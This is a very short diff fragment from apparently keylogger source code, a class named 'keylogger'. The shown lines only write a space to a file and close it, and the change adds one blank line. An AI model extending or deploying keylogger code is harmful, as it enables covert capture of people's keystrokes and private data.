@@ -54,3 +54,4 @@ class keylogger(object):
             file.write(" ")
             file.close()
         return True
+    
